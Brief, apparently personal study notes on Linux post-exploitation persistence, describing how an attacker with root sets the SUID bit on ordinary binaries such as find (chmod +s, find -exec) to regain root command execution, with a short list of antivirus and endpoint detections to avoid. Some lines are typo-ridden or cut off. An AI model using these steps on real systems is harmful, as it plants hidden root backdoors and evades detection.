# Metadata on files
People don't want to be leaving their back door files on host. So they get root >> change harmless binaries to execute commands with

# Things to be aware of that could trigger failure
* Endpoint could think its malicious
* behavior issue with endpoint
* anvtivirus on the host could trigger a warning

# Binaries that allow arbitrary code execution
* find / -name "*.gif" - this finds all GIFs on all of your computer
* below is how you use find to execute your commands
  * touch /tmp/foobar
  * find /temp/ -name "foobar" -exec id \;
  * rm -rf /tmp/foobar
* Other binaries that can allow you to execute commands: 
* chmod +s /usr/bin/find
touch /tmp/foobar
find /tmp/

# Strategy
1. Find a BACE
2. chmod +s BACE
3. execute commands as root with that binary

